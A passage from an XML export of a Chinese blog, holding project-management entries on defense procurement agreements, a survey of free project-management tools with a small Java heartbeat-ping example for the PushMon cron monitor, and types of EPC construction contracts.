<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.icourse163.org/course/tongji-46008">MOOC 课程表 | 同济大学《工程项目管理》</a></li>
<li><a href="http://www.wenxuecity.com/book/?act=view&amp;chapterID=4054413&amp;bookID=60360184">中国投资体制改革30年研究 &gt; 第三节 项目管理的科学化</a></li>
<li><a href="http://www.iolaw.org.cn/showArticle.aspx?id=2390">政府投资与投资体制改革三十年 | 作者：席月民 | 中国法学网</a></li>
<li><a href="http://www.scca.sh.cn/shownews.aspx?id=3742">面向可持续建设的工程管理——访同济大学教授、建设工程领域专家学者丁士昭</a></li>
<li><a href="https://mp.weixin.qq.com/s/gMiPK5YyiDxA2-xj6JsZFQ">《政府工程怎么管:深圳的实践与创新研究》|同济大学丁士昭教授和深圳市建筑工务署杨胜军署长</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-Defense-Procurement</title>
    <url>/2020/09/06/Project-Defense-Procurement/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="非传统国防承包商"><a href="#非传统国防承包商" class="headerlink" title="非传统国防承包商"></a>非传统国防承包商</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/s4e8nf2-oEi81JY_Byw5OQ" target="_blank" rel="noopener">美国防部吸引非传统国防承包商的利器 ——其他交易协议制度评析</a></li>
</ul>
<p>其它交易协议（Other Transaction Authorith,OTA）一种非常规的交易缔约模式近几年在美国防部大行其道，成为美军吸引和激励非传统国防承包商，特别是中小创新企业的重要制度和合同方式，在美军高超声速、人工智能、导弹防御等高技术快速研发和装备采办领域发挥了重要作用</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
  </entry>
  <entry>
    <title>PM指南:项目管理信息系统</title>
    <url>/2019/04/06/Project-PMIS/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>信息化带来的价值可以占到总投资的10%以上。换句话说，一个工程项目如果管理信息化工作成功了，可以节省十分之一的投资，这是一个非常可观的数据。所以如何做好工程管理信息化，如何将信息资源开发好，将信息技术利用好，对现在乃至将来的工程建设有着重大的意义。—— 丁士昭</p>
</blockquote>
<span id="more"></span>
<ul>
<li>项目管理信息系统，PMIS—Project Management Information System</li>
</ul>
<h2 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h2><ul>
<li><a href="https://riboseyim.com/2018/04/10/DevOps-Phoenix/">《凤凰项目》| 从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
</ul>
<h2 id="资源管理"><a href="#资源管理" class="headerlink" title="资源管理"></a>资源管理</h2><ul>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></li>
</ul>
<h2 id="行业应用案例"><a href="#行业应用案例" class="headerlink" title="行业应用案例"></a>行业应用案例</h2><h4 id="DevOps：从供应链管理到软件研发管理"><a href="#DevOps：从供应链管理到软件研发管理" class="headerlink" title="DevOps：从供应链管理到软件研发管理"></a>DevOps：从供应链管理到软件研发管理</h4><ul>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
</ul>
<h2 id="Free-Project-Management-Tools-Single-User-amp-Startup-Company"><a href="#Free-Project-Management-Tools-Single-User-amp-Startup-Company" class="headerlink" title="Free Project Management Tools (Single User &amp; Startup Company)"></a>Free Project Management Tools (Single User &amp; Startup Company)</h2><blockquote>
<p>Free is not free</p>
</blockquote>
<h4 id="Overview-of-Free-Project-Management-Tools"><a href="#Overview-of-Free-Project-Management-Tools" class="headerlink" title="Overview of Free Project Management Tools"></a>Overview of Free Project Management Tools</h4><div class="table-container">
<table>
<thead>
<tr>
<th>Name</th>
<th>focus</th>
<th>free version</th>
<th>company version</th>
<th>UI</th>
</tr>
</thead>
<tbody>
<tr>
<td>Asana</td>
<td>tracking everything</td>
<td>15 members</td>
<td>yes</td>
<td>beautiful</td>
</tr>
<tr>
<td>Paper</td>
<td>real-time reporting</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Trello</td>
<td>Kanban system</td>
<td>10MB  attach files</td>
<td>yes</td>
<td></td>
</tr>
<tr>
<td>PushMon</td>
<td>monitor cronjobs scripts</td>
<td>3 URLs, 4 credits</td>
<td>yes</td>
<td></td>
</tr>
<tr>
<td>Teamweek</td>
<td>manage schedules</td>
<td>5 members</td>
<td>yes</td>
<td></td>
</tr>
<tr>
<td>ClickUp</td>
<td>solution</td>
<td>all features</td>
<td>no</td>
<td></td>
</tr>
<tr>
<td>Wrike</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>OpenProject</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Gantt Project</td>
<td>gantt</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MelsterTask</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>KanbanFlow</td>
<td>Kanban board</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Labourhood</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Kanban Tool</td>
<td>Kanban board</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Redmine</td>
<td>professional</td>
<td>open-sourced</td>
<td>no</td>
<td>normal</td>
</tr>
<tr>
<td>Airtable</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Barvas</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>actiTIME</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h4 id="Asana"><a href="#Asana" class="headerlink" title="Asana"></a>Asana</h4><ul>
<li>focus：tracking everything</li>
<li>License：15 members</li>
<li>Cost：free</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Asana-Project-Management-Tool.png" alt="Asana - Project Management Tool"></p>
<h4 id="Paper"><a href="#Paper" class="headerlink" title="Paper"></a>Paper</h4><ul>
<li>focus：created by Dropbox;capture, organize, and prioritize issues, plan sprints, and take advantage of real-time reporting.</li>
<li>License：</li>
<li>Cost：free</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Dropbox-Paper.png" alt="Dropbox Paper - Collaborative Workspace"></p>
<h4 id="Trello"><a href="#Trello" class="headerlink" title="Trello"></a>Trello</h4><ul>
<li>focus: It implements the Kanban system</li>
<li>License：free &amp; company</li>
<li>Cost：free version can add 10MB of files from your computer or link any file in Google Drive, Box, OneDrive, and Dropbox accounts and you can add a max of 1 power-up per board.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Trello-Project-Management-Tool.png" alt="Trello - Project Management Tool"></p>
<h4 id="PushMon"><a href="#PushMon" class="headerlink" title="PushMon"></a><a href="https://www.pushmon.com">PushMon</a></h4><ul>
<li>focus: not a typical project management tool;It is used to <strong>monitor scripts, cronjobs, and scheduled tasks</strong> and get notifications directly to your email, mobile phone, etc.</li>
<li>License：free &amp; company</li>
<li>Cost：The free version of PusMon gives you access to 3 URLs, 4 credits, and instant notification alerts via email, SMS, Twitter, IFTTT, phone calls, etc.</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.teamextension.ping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UrlPing</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String urlString = <span class="string">&quot;http://pshmn.com/eaFnY&quot;</span>;</span><br><span class="line">		pingUrl(urlString);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pingUrl</span><span class="params">(String urlString)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			URLConnection conn = <span class="keyword">new</span> URL(urlString).openConnection();</span><br><span class="line">			conn.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">			conn.setReadTimeout(<span class="number">5000</span>);</span><br><span class="line">			InputStream is = conn.getInputStream();</span><br><span class="line">			is.close();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			<span class="comment">// log error</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Teamweek"><a href="#Teamweek" class="headerlink" title="Teamweek"></a>Teamweek</h4><ul>
<li>focus: track of deadlines in calendar form, manage schedules, create Gantt charts.</li>
<li>License：free &amp; company</li>
<li>Cost：The free version allows a maximum of 5 team members.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Teamweek-Project-Management-Software.png" alt="Teamweek - Project Management Software"></p>
<h4 id="ClickUp"><a href="#ClickUp" class="headerlink" title="ClickUp"></a>ClickUp</h4><ul>
<li>focus: project management solution.</li>
<li>License：free &amp; company</li>
<li>Cost：The free version gives you access to unlimited users, tasks, and projects.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/08/ClickUp-Sorting-and-Filtering.png" alt="ClickUp Sorting and Filtering"></p>
<h4 id="Wrike"><a href="#Wrike" class="headerlink" title="Wrike"></a>Wrike</h4><ul>
<li>focus: simplify your project plans, streamline your workflow, and enable collaboration.</li>
<li>License：free &amp; company</li>
<li>Cost：The free version allows a maximum of users in a team and you can use a simple shared task list for your projects.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Wrike.png" alt="Wrike - Project Management Software"></p>
<h4 id="OpenProject"><a href="#OpenProject" class="headerlink" title="OpenProject"></a>OpenProject</h4><ul>
<li>focus: simplify your project plans, streamline your workflow, and enable collaboration.</li>
<li>License：open-source &amp; free &amp; company (Community, Cloud, and Enterprise)</li>
<li>Cost：The community edition is available for free with features including time management, team collaboration, Gantt charts for project planning, budgeting, and reporting. It also supports Agile for project management with backlogs, roadmaps, bug tracking, etc.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/OpenProject-Collaborative-Project-Management.png" alt="OpenProject - Collaborative Project Management"></p>
<h4 id="Gantt-Project"><a href="#Gantt-Project" class="headerlink" title="Gantt Project"></a>Gantt Project</h4><ul>
<li>focus:  a work breakdown structure, draw dependency constraints, PERT charts, etc.</li>
<li>License：free software; GPL license.</li>
<li>Cost：java-based ; US$5 ?</li>
<li><a href="https://www.ganttproject.biz/download">download gantt project</a></li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Gantt-Project.jpg" alt="Gantt Project - Management Tool"></p>
<h4 id="MeisterTask"><a href="#MeisterTask" class="headerlink" title="MeisterTask"></a>MeisterTask</h4><ul>
<li>focus:  </li>
<li>License：version contains all the options required for creating unlimited projects and tasks. You can also collaborate on invited friends in real-time.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/MeisterTask.jpg" alt="MeisterTask - Task Management Tool"></p>
<h4 id="KanbanFlow"><a href="#KanbanFlow" class="headerlink" title="KanbanFlow"></a>KanbanFlow</h4><ul>
<li>focus:  a Lean tool for project management</li>
<li>License：free.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Kanban-Lean-Project-Management-Tool.png" alt="Kanban Lean Project Management Tool"></p>
<h4 id="Labourhood"><a href="#Labourhood" class="headerlink" title="Labourhood"></a>Labourhood</h4><ul>
<li>focus:  Labourhood is an online project management tool that focuses on online collaboration, networking, and security.</li>
<li>License：free.</li>
<li>Cost: Labourhood still in <strong>Beta version</strong> which is free to use all you have to do is sign up to create a free account.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Labourhood.jpg" alt="Labourhood Project Management Tool"></p>
<h4 id="Kanban-Tool"><a href="#Kanban-Tool" class="headerlink" title="Kanban Tool"></a>Kanban Tool</h4><ul>
<li>focus:  Kanban Tool is an online ponline Kanban board.</li>
<li>License：a 14-day free trial you can experiment with.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Kanban-Tool.png" alt="Kanban Tool"></p>
<h4 id="Redmine"><a href="#Redmine" class="headerlink" title="Redmine"></a>Redmine</h4><ul>
<li>focus:  professional features.</li>
<li>License：free &amp; open-source.</li>
<li>Cost：It is written using the Ruby on Rails framework.</li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/gantt@2x.png" alt="Remine gantt"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/workflow_example@2x.png" alt="Remine workflow"></p>
<h4 id="Airtable"><a href="#Airtable" class="headerlink" title="Airtable"></a>Airtable</h4><ul>
<li>focus:  spreadsheet-database hybrid.</li>
<li>License：free.</li>
<li>Cost：It is written using the Ruby on Rails framework.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Airtable.png" alt="Airtable"></p>
<h4 id="Barvas"><a href="#Barvas" class="headerlink" title="Barvas"></a>Barvas</h4><ul>
<li>focus:  focuses on improving your workflow and team productivity.</li>
<li>License：free(a single user account which is limited to a single project).</li>
<li>Cost： Access to unlimited projects costs $11.70 and the subscription is $5.85 per month.</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/Barvas-Project-and-Task-Management-Software.png" alt="Barvas: Project and Task Management Software"></p>
<h4 id="actiTIME"><a href="#actiTIME" class="headerlink" title="actiTIME"></a>actiTIME</h4><ul>
<li>focus: time tracking and using intelligent methods to analyze data</li>
<li>License：free for up to 3 users</li>
<li>Cost： $394.00 USD per year for 5 users ($6.57/month per user).</li>
</ul>
<p><img src="https://www.fossmint.com/wp-content/uploads/2018/10/actiTIME-Time-Tracking-Scope-Management-Software.png" alt="actiTIME - Time Tracking &amp; Scope Management Software"></p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h4 id="技术专题-DevOps-漫谈系列"><a href="#技术专题-DevOps-漫谈系列" class="headerlink" title="技术专题  DevOps 漫谈系列 "></a>技术专题 <a href="https://riboseyim.github.io/2016/07/28/DevOps/"> DevOps 漫谈系列 </a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">DevOps 漫谈：Linux 容器安全的十重境界</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://en.wikipedia.org/wiki/Comparison_of_project_management_software">Comparison of project management software</a></li>
<li><a href="https://www.fossmint.com/best-free-project-management-tools/">17 Best Free Project Management Tools for You | May 7, 2019by Martins D. Okoi</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:项目采购管理</title>
    <url>/2019/03/12/Project-Procurement/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="合同管理"><a href="#合同管理" class="headerlink" title="合同管理"></a>合同管理</h2><h2 id="常规合同"><a href="#常规合同" class="headerlink" title="常规合同"></a>常规合同</h2><h4 id="工料合同"><a href="#工料合同" class="headerlink" title="工料合同"></a>工料合同</h4><h4 id="固定总价合同"><a href="#固定总价合同" class="headerlink" title="固定总价合同"></a>固定总价合同</h4><h4 id="总价-激励费用合同"><a href="#总价-激励费用合同" class="headerlink" title="总价+激励费用合同"></a>总价+激励费用合同</h4><h4 id="成本-固定费用合同"><a href="#成本-固定费用合同" class="headerlink" title="成本+固定费用合同"></a>成本+固定费用合同</h4><div class="table-container">
<table>
<thead>
<tr>
<th>合同名称/英文</th>
<th>范围</th>
<th>专业度</th>
<th>立即签约</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>总价</td>
<td>清晰</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>成本/工料</td>
<td>不清晰</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>成本+激励</td>
<td></td>
<td>专业内行</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>工料</td>
<td></td>
<td>不专业</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td>是</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td>否</td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h2 id="EPC-合同"><a href="#EPC-合同" class="headerlink" title="EPC 合同"></a>EPC 合同</h2><p>定价机制：传统的EPC合同通常采用固定总价（Firm and Fixed Lump-sum）签订EPC合同。</p>
<h3 id="EPC-服务范围"><a href="#EPC-服务范围" class="headerlink" title="EPC 服务范围"></a>EPC 服务范围</h3><h4 id="1-开口估算的EPC模式-Open-Estimate-EPC"><a href="#1-开口估算的EPC模式-Open-Estimate-EPC" class="headerlink" title="1. 开口估算的EPC模式(Open Estimate EPC)"></a>1. 开口估算的EPC模式(Open Estimate EPC)</h4><p>实质：承包商增加了前期技术咨询服务工作。此类合同通常被称为“开口估算的EPC合同”，或“自造的EPC合同”。</p>
<p>承包商主动替业主去做前期咨询工作，包括前期规划、可行性研究工作等，等到前期工作达到一定深度，开始与业主谈判EPC合同，确定合同价格，签订合同后继续履约。</p>
<p>由于开展前期工作的费用并没有确定，万一双方合同谈判不成功，业主可以选择支付少量的前期服务费。</p>
<h4 id="2-EPC-运营维护（OM）"><a href="#2-EPC-运营维护（OM）" class="headerlink" title="2. EPC +运营维护（OM）"></a>2. EPC +运营维护（OM）</h4><p>实质：对传统EPC服务范围的一种“后延”。此模式也称为“DBO”模式。</p>
<p>在工程竣工后，业主往往会再要求承包商运营和维护一段时间。在此期间，承包商需要对业主的运营团队进行培训，以便运营结束后移交给业主。这种模式对业主的好处是，既弥补了业主前期运营能力的不足，培养了业主的运营队伍，同时又能激励承包商保证工程质量。</p>
<h4 id="3-EPCm-EPCa"><a href="#3-EPCm-EPCa" class="headerlink" title="3. EPCm/EPCa"></a>3. EPCm/EPCa</h4><p>实质：对传统EPC服务范围的一种压缩。</p>
<p>对于一些工业项目，尤其是流程工业，有些工程公司的设计、采购力量很强，但施工力量不足，而设计与采购、施工工作之间又有很强的“粘结度”，因此，业主会让此类总承包商负责工程设计、采购以及提供施工管理服务（EP+Construction Management），但施工安装工作则由业主与另外的承包商签订施工安装合同。该模式通常称为“EPCm模式”，总承包商对工程的进度、质量、健康—安全—环境管理体系（HSE）等负责全面管理。</p>
<p>有时，业主不让此类总承包商承担施工管理工作，而只是提供与其设计、采购工作相关的“接口工作”，提供一些技术支持等顾问性质的服务（Advisory service），如设计与施工的协调以及设备的安装等技术调试，从而形成了“EPCa模式”。</p>
<h4 id="4-EPC-F"><a href="#4-EPC-F" class="headerlink" title="4. EPC+F"></a>4. EPC+F</h4><p>实质：项目业主资金缺乏，例如发展中国家政府部门业主。</p>
<p>EPC+F模式即：除了传统的设计、采购、施工、试运行服务（EPC）之外，承包商还提供融资服务（Financing）。具体的融资服务包括两种方式：</p>
<ul>
<li>买方信贷（Buyer’s credit）</li>
<li>卖方信贷（Seller’s credit）</li>
</ul>
<p>买方信贷模式下，承包商协助项目业主从金融机构获得项目贷款，由业主与金融机构签订贷款合同，业主按贷款合同规定，从金融机构获得项目款项并归还贷款本金和利息。</p>
<p>卖方信贷模式下，承包商以承包项目为背景，向相关金融机构贷款，用于建设 EPC 项目，项目业主根据EPC合同中关于融资安排及还款的规定，在项目竣工后的某一时间段内归还EPC承包商本金和利息，EPC 承包商再用该款项来归还金融机构的融资本金和利息。由于EPC承包商承担贷款风险，这实际上是一种承包商带资承包的EPC模式。</p>
<p>中国的对外工程承包商近年来采用此类EPC+F模式比较多，尤其是买方信贷下的EPC模式。</p>
<h4 id="5-EPC-I"><a href="#5-EPC-I" class="headerlink" title="5. EPC+I"></a>5. EPC+I</h4><p>实质：EPC+I 模式下，除了传统的EPC承包商的角色之外，承包商还是投资人之一，在PPP模式下最为常见。</p>
<p>这种模式的好处是，承包商往往通过向项目投入少量的股权资金，通常在5%-10%之间，换取承包权。而项目业主也通过承包商获得了项目附加投资人，减轻了投资负担，同时也将承包商的利益与项目投资人的利益绑定，有助于实现“激励兼容”。</p>
<p>具体操作上，双方分别签订两个合同，一个是股权投资协议，另一个是承包服务EPC合同。有时候，股权投资协议往往是以EPC承包商控股的投资公司与业主项目公司签订。</p>
<h3 id="EPC-合同签约机制"><a href="#EPC-合同签约机制" class="headerlink" title="EPC 合同签约机制"></a>EPC 合同签约机制</h3><p>与传统上业主与承包商签订EPC合同的模式相比，近年来在实践中出现了两种新型的EPC签约机制：分体式EPC模式与更替式EPC模式。</p>
<h4 id="1-传统EPC模式"><a href="#1-传统EPC模式" class="headerlink" title="1.传统EPC模式"></a>1.传统EPC模式</h4><h4 id="2-分体式EPC模式"><a href="#2-分体式EPC模式" class="headerlink" title="2.分体式EPC模式"></a>2.分体式EPC模式</h4><p>在国际上绝大多数国家的税收法律中，货物和工程承包服务的税种和税率并不一样，鼓励类开发项目引进的进口设备被免征关税和进口环节的增值税或其他税种。因此，为了充分利用项目所在国的税收政策，合理避税，项目业主在与EPC承包商签订EPC合同时，往往会对总承包合同进行拆分，即所谓的分体式EPC合同（Split EPC contract）。一个EPC合同通常被拆分为三类子合同。</p>
<ul>
<li>（1）离岸设计与供货合同（Offshore EP Contract）</li>
</ul>
<p>范围包括设计、需从中国进口的设备和材料、海洋运输以及调试、性能考核、质保服务等附属性服务；签约主体一般为EPC承包商在中国境内的实际执行主体（母公司或子公司）。</p>
<ul>
<li>（2）在岸承包合同（Onshore EPC Contract）</li>
</ul>
<p>范围包括东道国境内工程的设计、土建、安装，境内所采购材料的供应、内陆运输，现场项目管理及境内工程的质保服务等；根据不同国家法律对承包主体的资格及税务登记的要求，签约主体一般为EPC承包商在项目所在国注册设立的子公司。</p>
<ul>
<li>（3）协调及保证协议（Wrap Around Guarantee Agreement，简称“盖帽协议”）</li>
</ul>
<p>该协议由项目业主、中国母公司及其相关子公司共同签署，以确保境外设计与供应合同和东道国境内承包合同之间接口无缝衔接，两者互相承担连带保证责任，同一违约事件不受双重处罚，并明晰关于违约金上限、合同总责任上限、保函、保险等条款的总体安排。该协议效力高于上述两份合同，本质上是为了说明合同虽然被拆分，但仍应视为同一个整体。</p>
<p>上述分体式EPC模式，不但能够进行税务优化，而且还能满足项目所在国对工程承包企业的属地要求，同时可以根据项目的具体情况，明确支付币种，合理减少汇率风险。</p>
<h4 id="3-更替式EPC模式"><a href="#3-更替式EPC模式" class="headerlink" title="3. 更替式EPC模式"></a>3. 更替式EPC模式</h4><p>对于大型的工业项目，往往包含大量的长周期非标设备，这类非标设备的供应往往需要很长的周期。同时，这类工业项目往往工期紧迫，业主希望尽快竣工投产，若等到签订了EPC合同后由承包商再去采购，往往会花费很长时间，延长整个项目的工期。因此，为了加快工程建设进度，业主在前期设计项目采购策略时，往往将很多长周期非标设备从EPC合同中剥离出来，提前签订采购合同，并作为“甲供物资”，在签订EPC合同后按约定移交给承包商。这样可以实现供货合同与EPC合同同时签订，缩短整个项目的建设周期。</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ul>
<li>案例：国家电网|2011年，委瑞内拉古里电站EPC工程总包</li>
</ul>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/" target="_blank" rel="noopener">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/" target="_blank" rel="noopener">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/" target="_blank" rel="noopener">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/BRb2kO6mSx62ixh091wuPA" target="_blank" rel="noopener">国际EPC模式的演变 |张水波 王秀芹  全球工程经营  2018-08-20</a></li>
<li><a href="https://mp.weixin.qq.com/s/aBrxgbIw2NPrWjta_zh8ew" target="_blank" rel="noopener">国外国防工业发展的动力机制 | 知远战略与防务研究所  2018-05-14</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:项目资源管理</title>
    <url>/2019/03/12/Project-Resources/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
